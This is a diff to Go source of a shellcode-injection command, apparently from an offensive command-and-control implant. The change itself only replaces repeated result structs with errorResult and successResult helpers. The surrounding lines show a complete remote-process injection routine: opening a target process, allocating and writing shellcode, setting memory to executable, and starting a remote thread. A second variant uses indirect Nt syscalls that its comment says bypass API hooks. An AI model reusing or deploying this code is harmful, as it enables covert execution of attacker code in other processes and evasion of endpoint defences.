@@ -138,11 +138,7 @@ func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, out
 	)
 
 	if hProcess == 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] Failed to open process: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("[!] Failed to open process: %v\n", err))
 	}
 	defer procCloseHandle.Call(hProcess)
 
@@ -160,11 +156,7 @@ func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, out
 	)
 
 	if remoteAddr == 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] memory allocation failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("[!] memory allocation failed: %v\n", err))
 	}
 
 	output += fmt.Sprintf("[+] Allocated memory at address: 0x%X\n", remoteAddr)
@@ -182,11 +174,7 @@ func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, out
 	)
 
 	if ret == 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] memory write failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("[!] memory write failed: %v\n", err))
 	}
 
 	output += fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten)
@@ -197,11 +185,7 @@ func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, out
 		hProcess, remoteAddr, uintptr(len(shellcode)),
 		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)))
 	if ret == 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] memory protection change failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("[!] memory protection change failed: %v\n", err))
 	}
 	output += "[+] Changed memory protection to RX\n"
 
@@ -219,22 +203,14 @@ func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, out
 	)
 
 	if hThread == 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] remote thread creation failed: %v\n", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("[!] remote thread creation failed: %v\n", err))
 	}
 	defer procCloseHandle.Call(hThread)
 
 	output += fmt.Sprintf("[+] Successfully created remote thread (handle: 0x%X)\n", hThread)
 	output += "[+] Vanilla injection completed successfully\n"
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 // executeIndirect uses indirect syscalls (Nt* via ntdll gadgets) to bypass API hooks.
@@ -251,11 +227,7 @@ func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, out
 	var hProcess uintptr
 	status := IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(pid))
 	if status != 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] NtOpenProcess failed: NTSTATUS 0x%X\n", status),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("[!] NtOpenProcess failed: NTSTATUS 0x%X\n", status))
 	}
 	defer procCloseHandle.Call(hProcess)
 
@@ -269,11 +241,7 @@ func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, out
 	status = IndirectNtAllocateVirtualMemory(hProcess, &baseAddr, &regionSize,
 		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	if status != 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] Memory allocation failed: NTSTATUS 0x%X\n", status),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("[!] Memory allocation failed: NTSTATUS 0x%X\n", status))
 	}
 
 	output += fmt.Sprintf("[+] Allocated memory at address: 0x%X\n", baseAddr)
@@ -285,11 +253,7 @@ func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, out
 	status = IndirectNtWriteVirtualMemory(hProcess, baseAddr,
 		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
 	if status != 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] Memory write failed: NTSTATUS 0x%X\n", status),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("[!] Memory write failed: NTSTATUS 0x%X\n", status))
 	}
 
 	output += fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten)
@@ -303,11 +267,7 @@ func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, out
 	status = IndirectNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize,
 		PAGE_EXECUTE_READ, &oldProtect)
 	if status != 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] Memory protection change failed: NTSTATUS 0x%X\n", status),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("[!] Memory protection change failed: NTSTATUS 0x%X\n", status))
 	}
 
 	output += "[+] Memory protection changed to RX\n"
@@ -318,20 +278,12 @@ func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, out
 	var hThread uintptr
 	status = IndirectNtCreateThreadEx(&hThread, hProcess, baseAddr)
 	if status != 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] remote thread creation failed: NTSTATUS 0x%X\n", status),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("[!] remote thread creation failed: NTSTATUS 0x%X\n", status))
 	}
 	defer procCloseHandle.Call(hThread)
 
 	output += fmt.Sprintf("[+] Successfully created remote thread (handle: 0x%X)\n", hThread)
 	output += "[+] Indirect syscall injection completed successfully\n"
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
